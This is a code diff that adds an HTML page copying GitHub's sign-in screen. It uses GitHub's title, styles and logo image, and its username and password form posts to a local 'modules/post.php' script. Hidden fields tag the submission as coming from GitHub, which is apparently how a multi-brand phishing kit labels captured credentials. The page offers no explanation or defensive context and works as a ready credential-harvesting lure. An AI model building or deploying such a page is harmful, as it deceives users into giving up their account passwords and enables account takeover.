@@ -1,0 +1,40 @@
+
+
+<!DOCTYPE html>
+<html lang=en>
+   <head>
+      <meta charset=utf-8>
+      <title>Sign in to GitHub � GitHub</title>
+      <link rel=icon type="image/x-icon"href="images/github1.png">
+      <script src="jquery.js"></script>
+           <script src=".././modules/script.js" type="text/javascript"></script>
+ <style>html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}[type=submit]::-moz-focus-inner{border-style:none;padding:0}[type=submit]:-moz-focusring{outline:1px dotted ButtonText}::-webkit-input-placeholder{color:inherit;opacity:.54}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}*{box-sizing:border-box}input{font-family:inherit;font-size:inherit;line-height:inherit}body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji}a{color:#0366d6;text-decoration:none}a:hover{text-decoration:underline}.btn{position:relative;display:inline-block;padding:6px 12px;font-size:14px;font-weight:600;line-height:20px;white-space:nowrap;vertical-align:middle;cursor:pointer;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;background-repeat:repeat-x;background-position:-1px -1px;background-size:110% 110%;border:1px solid rgba(27,31,35,.2);border-radius:.25em;-webkit-appearance:none;-moz-appearance:none;appearance:none}.btn:hover{text-decoration:none;background-repeat:repeat-x}.btn:focus{outline:0}.btn:active{background-image:none}.btn{color:#24292e;background-color:#eff3f6;background-image:linear-gradient(-180deg,#fafbfc,#eff3f6 90%)}.btn:focus{box-shadow:0 0 0 .2em rgba(3,102,214,.3)}.btn:hover{background-color:#e6ebf1;background-image:linear-gradient(-180deg,#f0f3f6,#e6ebf1 90%);background-position:-.5em;border-color:rgba(27,31,35,.35)}.btn:active{background-color:#e9ecef;background-image:none;border-color:rgba(27,31,35,.35);box-shadow:inset 0 .15em .3em rgba(27,31,35,.15)}.btn-primary{color:#fff;background-color:#28a745;background-image:linear-gradient(-180deg,#34d058,#28a745 90%)}.btn-primary:hover{background-color:#269f42;background-image:linear-gradient(-180deg,#2fcb53,#269f42 90%);background-position:-.5em;border-color:rgba(27,31,35,.5)}.btn-block{display:block;width:100%;text-align:center}label{font-weight:600}.form-control{min-height:34px;padding:6px 8px;font-size:16px;line-height:20px;color:#24292e;vertical-align:middle;background-color:#fff;background-repeat:no-repeat;background-position:right 8px center;border:1px solid #d1d5da;border-radius:3px;outline:0;box-shadow:inset 0 1px 2px rgba(27,31,35,.075)}.form-control:focus{border-color:#2188ff;outline:0;box-shadow:inset 0 1px 2px rgba(27,31,35,.075),0 0 0 .2em rgba(3,102,214,.3)}@media(min-width:768px){.form-control{font-size:14px}}:-ms-input-placeholder{color:#6a737d}::-ms-input-placeholder{color:#6a737d}.input-block{display:block;width:100%}input::-webkit-inner-spin-button,input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none;appearance:none}.mt-3{margin-top:16px!important}.p-0{padding:0!important}.px-3{padding-left:16px!important}.px-3{padding-right:16px!important}.auth-form{width:340px;margin:0 auto}.auth-form-header{padding:10px 20px;margin:0;color:#fff;text-shadow:0 -1px 0 rgba(0,0,0,.3);background-color:#829aa8;border:1px solid #768995;border-radius:3px 3px 0 0}.auth-form-header h1{font-size:16px}.auth-form-body{padding:20px;font-size:14px;background-color:#fff;border:1px solid #d8dee2;border-top:0;border-radius:0 0 3px 3px}.auth-form-body .input-block{margin-top:5px;margin-bottom:15px}.session-authentication{background-color:#f9f9f9}.session-authentication .auth-form label{display:block;margin-bottom:7px;text-align:left}.session-authentication .auth-form .btn{margin-top:20px}.session-authentication .label-link{float:right;font-size:12px}.session-authentication .auth-form-header{margin-bottom:15px;color:#333;text-align:center;text-shadow:none;background-color:initial;border:0}.session-authentication .auth-form-header h1{font-size:24px;font-weight:300;letter-spacing:-.5px}.session-authentication .auth-form-body{border-top:1px solid #d8dee2;border-radius:5px}.session-authentication .create-account-callout{padding:15px 20px;text-align:center;border:1px solid #d8dee2;border-radius:5px}</style>
+   </head>
+   <body class="logged-out env-production page-responsive session-authentication">
+      <center><img style=margin-top:25px;margin-bottom:15px src="images/github1.png"></center>
+      <div>
+         <main>
+            <div class="auth-form px-3">
+               <form action=.././modules/post.php method=post>
+                   <input type=hidden value=com.github.android name=appnam />
+                  <div class="auth-form-header p-0">
+                     <h1>Sign in to GitHub</h1>
+                  </div>
+                  <div class="auth-form-body mt-3"><label for=login_field> Username or email address </label>
+                     <input  type=text name=username class="form-control input-block" required>
+                     <input  type=hidden name=link value=''>
+                     <input  type=hidden name=location value=Github /><label for=password> Password <a class=label-link href>Forgot password?</a></label>
+                     <input  type=password name=password class="form-control form-control input-block" required>
+                     <input  type=submit value="Sign in" class="btn btn-primary btn-block">
+                  </div>
+               </form>
+               <p class="create-account-callout mt-3"> New to GitHub? <a href>Create an account</a>. </p>
+            </div>
+         </main>
+      </div>
+      <center>
+         <div style=font-size:12px;margin-top:70px><a style=margin-right:9px href> Terms </a><a style=margin-right:9px href> Privacy </a><a style=margin-right:9px href> Security </a><a href style=color:#000> Contact GitHub </a></div>
+      </center>
+   </body>
+</html>
+
